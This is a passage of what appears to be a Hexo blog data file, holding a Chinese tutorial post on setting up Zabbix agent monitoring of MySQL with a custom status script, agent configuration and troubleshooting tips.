class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[accepts]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[handled]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;0000C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[requests]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">    &lt;/graphs&gt;</span><br><span class=\"line\">&lt;/zabbix_<span class=\"built_in\">export</span>&gt;</span><br></pre></td></tr></table></figure>"},{"title":"zabbix监控mysql","date":"2016-09-29T10:24:17.000Z","toc":false,"_content":"\n> zabbix自带mysql监控模板，可监控mysql的增删改查、请求流量带宽和响应流量带宽等。\n\n### 监控步骤\n\n1、服务器上安装zabbix agent客户端，并修改zabbix_agentd.conf文件\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n2、编写check_mysql.sh脚本, 存放路径：/etc/zabbix/scripts。\n并赋予脚本执行权限【chmod +x check_mysql.sh】。\n\n<!-- more -->\n\n```bash\n# 用户名\nMYSQL_USER=''\n\n# 密码\nMYSQL_PWD=''\n\n# 主机地址/IP\nMYSQL_HOST=''\n\n# 端口\nMYSQL_PORT=''\n\n# 数据连接\nMYSQL_CONN=\"/usr/bin/mysqladmin -u${MYSQL_USER} -p${MYSQL_PWD} -h${MYSQL_HOST} -P${MYSQL_PORT}\"\n \n# 参数是否正确\nif [ $# -ne \"1\" ];then \n    echo \"arg error!\" \nfi \n \n# 获取数据\ncase $1 in \n    Uptime) \n        result=`${MYSQL_CONN} status|cut -f2 -d\":\"|cut -f1 -d\"T\"` \n        echo $result \n        ;; \n    Com_update) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_update\"|cut -d\"|\" -f3` \n        echo $result \n        ;; \n    Slow_queries) \n        result=`${MYSQL_CONN} status |cut -f5 -d\":\"|cut -f1 -d\"O\"` \n        echo $result \n        ;; \n    Com_select) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_select\"|cut -d\"|\" -f3` \n        echo $result \n                ;; \n    Com_rollback) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_rollback\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Questions) \n        result=`${MYSQL_CONN} status|cut -f4 -d\":\"|cut -f1 -d\"S\"` \n                echo $result \n                ;; \n    Com_insert) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_insert\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_delete) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_delete\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_commit) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_commit\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Bytes_sent) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_sent\" |cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Bytes_received) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_received\" |cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_begin) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_begin\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n                        \n        *) \n        echo \"Usage:$0(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)\" \n        ;; \nesac\n\n```\n\n3、修改/etc/zabbix/zabbix_agentd.d下的userparameter_mysql.conf文件，没有就自行创建。\n注释掉原有key，在最后一行新增如下数据：\n```bash\nUserParameter=mysql.version,mysql -V\nUserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c alive\nUserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh $1\n```\n\n4、重启zabbix客户端\n```bash\nservice zabbix-agent restart\n```\n\n5、在zabbix服务器上添加监控主机和mysql模板，然后点击【图形】->【预览】，查看相关监控图像。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/1.png)\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/2.png)\n\n6、安装grafana-zabbix插件，通过grafana监控相关数据。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/3.png)\n\n<br/>\n\n---\n\n### 问题排查思路\n\n如果发现监控没有数据，请排查如下问题：\n- abbix客户端是否重启\n- 脚本是否有执行权限\n- 数据库是否有权限\n- 环境变量是否有问题\n- zabbix item列是否显示红叉【鼠标移至图标，有错误提示】\n\n<font style=\"color:red\">具体错误，可以查看zabbix agent打印的日志</font>。\n默认地址为：LogFile=/var/log/zabbix/zabbix_agentd.log，可在zabbix_agentd.conf中修改。\n\n<font style=\"color:red\">**此处需要注意的是**</font>，根据错误提示修改了配置，并重启了zabbix客户端，zabbix 服务器的item错误提示并不会马上消失，监控页面也不会马上产生数据，因此不要立马判断你的修改无效，有效方法是先查看是否有错误日志打印。\n\n<br/>\n\n---\n\n### 错误相关\n\n- 如果日志提示错误【/bin/sh^M: bad interpreter: No such file or directory】，那是shell脚本编码格式错误导致的，vim进入脚本文件，敲命令【:set ff=unix】，保存退出即可。\n\n- 如果日志提示警告【mysqladmin: [Warning] Using a password on the command line interface can be insecure.】，那么需要额外定义一个.my.cnf文件，然后check_mysql.sh的用户名密码等从.my.cnf读取。\n\n- 如果zabbix服务器item项总是提示【Not supported by Zabbix Agent】，不是配置问题就是版本问题，可以在zabbix server上执行zabbix_get命令来试着获取item值。\n```bash\nyum list all |grep zabbix-get\nyum install zabbix-get.x86_64\n\n/usr/bin/zabbix_get -s 127.0.0.1 -p 10050 -k \"system.cpu.load[all,avg15]\"\n0.270000\n```\n\n<br/>\n\n---\n\n### 其他\nzabbix可以自定义监控模板，用来监控mysql、tomcat和nginx等。\n监控模板网上可以搜索到，然后点击【组态】->【模板】->【汇入】即可。\n由于汇入的模板默认会覆盖原有配置，所以记得事先点击模板列表左下角的【汇出】进行相关模板备份。\n\n<br/>","source":"_posts/zabbix监控mysql.md","raw":"---\ntitle: zabbix监控mysql\ncategories:\n  - 运维部署\ntags:\n  - zabbix\n  - mysql\ndate: 2016-9-29 18:24:17\ntoc: false\n---\n\n> zabbix自带mysql监控模板，可监控mysql的增删改查、请求流量带宽和响应流量带宽等。\n\n### 监控步骤\n\n1、服务器上安装zabbix agent客户端，并修改zabbix_agentd.conf文件\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n2、编写check_mysql.sh脚本, 存放路径：/etc/zabbix/scripts。\n并赋予脚本执行权限【chmod +x check_mysql.sh】。\n\n<!-- more -->\n\n```bash\n# 用户名\nMYSQL_USER=''\n\n# 密码\nMYSQL_PWD=''\n\n# 主机地址/IP\nMYSQL_HOST=''\n\n# 端口\nMYSQL_PORT=''\n\n# 数据连接\nMYSQL_CONN=\"/usr/bin/mysqladmin -u${MYSQL_USER} -p${MYSQL_PWD} -h${MYSQL_HOST} -P${MYSQL_PORT}\"\n \n# 参数是否正确\nif [ $# -ne \"1\" ];then \n    echo \"arg error!\" \nfi \n \n# 获取数据\ncase $1 in \n    Uptime) \n        result=`${MYSQL_CONN} status|cut -f2 -d\":\"|cut -f1 -d\"T\"` \n        echo $result \n        ;; \n    Com_update) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_update\"|cut -d\"|\" -f3` \n        echo $result \n        ;; \n    Slow_queries) \n        result=`${MYSQL_CONN} status |cut -f5 -d\":\"|cut -f1 -d\"O\"` \n        echo $result \n        ;; \n    Com_select) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_select\"|cut -d\"|\" -f3` \n        echo $result \n                ;; \n    Com_rollback) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_rollback\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Questions) \n        result=`${MYSQL_CONN} status|cut -f4 -d\":\"|cut -f1 -d\"S\"` \n                echo $result \n                ;; \n    Com_insert) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_insert\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_delete) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_delete\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_commit) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_commit\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Bytes_sent) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_sent\" |cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Bytes_received) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_received\" |cut -d\"|\" -f3` \n                echo $result \n                ;; \n    Com_begin) \n        result=`${MYSQL_CONN} extended-status |grep -w \"Com_begin\"|cut -d\"|\" -f3` \n                echo $result \n                ;; \n                        \n        *) \n        echo \"Usage:$0(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)\" \n        ;; \nesac\n\n```\n\n3、修改/etc/zabbix/zabbix_agentd.d下的userparameter_mysql.conf文件，没有就自行创建。\n注释掉原有key，在最后一行新增如下数据：\n```bash\nUserParameter=mysql.version,mysql -V\nUserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c alive\nUserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh $1\n```\n\n4、重启zabbix客户端\n```bash\nservice zabbix-agent restart\n```\n\n5、在zabbix服务器上添加监控主机和mysql模板，然后点击【图形】->【预览】，查看相关监控图像。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/1.png)\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/2.png)\n\n6、安装grafana-zabbix插件，通过grafana监控相关数据。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/3.png)\n\n<br/>\n\n---\n\n### 问题排查思路\n\n如果发现监控没有数据，请排查如下问题：\n- abbix客户端是否重启\n- 脚本是否有执行权限\n- 数据库是否有权限\n- 环境变量是否有问题\n- zabbix item列是否显示红叉【鼠标移至图标，有错误提示】\n\n<font style=\"color:red\">具体错误，可以查看zabbix agent打印的日志</font>。\n默认地址为：LogFile=/var/log/zabbix/zabbix_agentd.log，可在zabbix_agentd.conf中修改。\n\n<font style=\"color:red\">**此处需要注意的是**</font>，根据错误提示修改了配置，并重启了zabbix客户端，zabbix 服务器的item错误提示并不会马上消失，监控页面也不会马上产生数据，因此不要立马判断你的修改无效，有效方法是先查看是否有错误日志打印。\n\n<br/>\n\n---\n\n### 错误相关\n\n- 如果日志提示错误【/bin/sh^M: bad interpreter: No such file or directory】，那是shell脚本编码格式错误导致的，vim进入脚本文件，敲命令【:set ff=unix】，保存退出即可。\n\n- 如果日志提示警告【mysqladmin: [Warning] Using a password on the command line interface can be insecure.】，那么需要额外定义一个.my.cnf文件，然后check_mysql.sh的用户名密码等从.my.cnf读取。\n\n- 如果zabbix服务器item项总是提示【Not supported by Zabbix Agent】，不是配置问题就是版本问题，可以在zabbix server上执行zabbix_get命令来试着获取item值。\n```bash\nyum list all |grep zabbix-get\nyum install zabbix-get.x86_64\n\n/usr/bin/zabbix_get -s 127.0.0.1 -p 10050 -k \"system.cpu.load[all,avg15]\"\n0.270000\n```\n\n<br/>\n\n---\n\n### 其他\nzabbix可以自定义监控模板，用来监控mysql、tomcat和nginx等。\n监控模板网上可以搜索到，然后点击【组态】->【模板】->【汇入】即可。\n由于汇入的模板默认会覆盖原有配置，所以记得事先点击模板列表左下角的【汇出】进行相关模板备份。\n\n<br/>","slug":"zabbix监控mysql","published":1,"updated":"2016-11-18T01:17:04.157Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruld6003igwtmlovemqag","content":"<blockquote>\n<p>zabbix&#x81EA;&#x5E26;mysql&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x53EF;&#x76D1;&#x63A7;mysql&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x3001;&#x8BF7;&#x6C42;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x548C;&#x54CD;&#x5E94;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x7B49;&#x3002;</p>\n</blockquote>\n<h3 id=\"&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\"><a href=\"#&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\" class=\"headerlink\" title=\"&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\"></a>&#x76D1;&#x63A7;&#x6B65;&#x9AA4;</h3><p>1&#x3001;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>2&#x3001;&#x7F16;&#x5199;check_mysql.sh&#x811A;&#x672C;, &#x5B58;&#x653E;&#x8DEF;&#x5F84;&#xFF1A;/etc/zabbix/scripts&#x3002;<br>&#x5E76;&#x8D4B;&#x4E88;&#x811A;&#x672C;&#x6267;&#x884C;&#x6743;&#x9650;&#x3010;chmod +x check_mysql.sh&#x3011;&#x3002;</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7528;&#x6237;&#x540D;</span></span><br><span class=\"line\">MYSQL_USER=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5BC6;&#x7801;</span></span><br><span class=\"line\">MYSQL_PWD=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3B;&#x673A;&#x5730;&#x5740;/IP</span></span><br><span class=\"line\">MYSQL_HOST=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x7AEF;&#x53E3;</span></span><br><span class=\"line\">MYSQL_PORT=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6570;&#x636E;&#x8FDE;&#x63A5;</span></span><br><span class=\"line\">MYSQL_CONN=<span class=\"string\">&quot;/usr/bin/mysqladmin -u<span class=\"variable\">${MYSQL_USER}</span> -p<span class=\"variable\">${MYSQL_PWD}</span> -h<span class=\"variable\">${MYSQL_HOST}</span> -P<span class=\"variable\">${MYSQL_PORT}</span>&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x53C2;&#x6570;&#x662F;&#x5426;&#x6B63;&#x786E;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> <span class=\"_\">-ne</span> <span class=\"string\">&quot;1&quot;</span> ];<span class=\"keyword\">then</span> </span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;arg error!&quot;</span> </span><br><span class=\"line\"><span class=\"keyword\">fi</span> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x83B7;&#x53D6;&#x6570;&#x636E;</span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"variable\">$1</span> <span class=\"keyword\">in</span> </span><br><span class=\"line\">    Uptime) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status|cut <span class=\"_\">-f</span>2 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;T&quot;</span>` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Com_update) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_update&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Slow_queries) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status |cut <span class=\"_\">-f</span>5 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;O&quot;</span>` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Com_select) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_select&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_rollback) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_rollback&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Questions) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status|cut <span class=\"_\">-f</span>4 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;S&quot;</span>` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_insert) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_insert&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_delete) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_delete&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_commit) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_commit&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Bytes_sent) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Bytes_sent&quot;</span> |cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Bytes_received) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Bytes_received&quot;</span> |cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_begin) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_begin&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">                        </span><br><span class=\"line\">        *) </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage:<span class=\"variable\">$0</span>(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)&quot;</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br></pre></td></tr></table></figure>\n<p>3&#x3001;&#x4FEE;&#x6539;/etc/zabbix/zabbix_agentd.d&#x4E0B;&#x7684;userparameter_mysql.conf&#x6587;&#x4EF6;&#xFF0C;&#x6CA1;&#x6709;&#x5C31;&#x81EA;&#x884C;&#x521B;&#x5EFA;&#x3002;<br>&#x6CE8;&#x91CA;&#x6389;&#x539F;&#x6709;key&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x65B0;&#x589E;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserParameter=mysql.version,mysql -V</span><br><span class=\"line\">UserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c alive</span><br><span class=\"line\">UserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh <span class=\"variable\">$1</span></span><br></pre></td></tr></table></figure></p>\n<p>4&#x3001;&#x91CD;&#x542F;zabbix&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-agent restart</span><br></pre></td></tr></table></figure></p>\n<p>5&#x3001;&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x548C;mysql&#x6A21;&#x677F;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;-&gt;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/1.png\" alt=\"\"></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/2.png\" 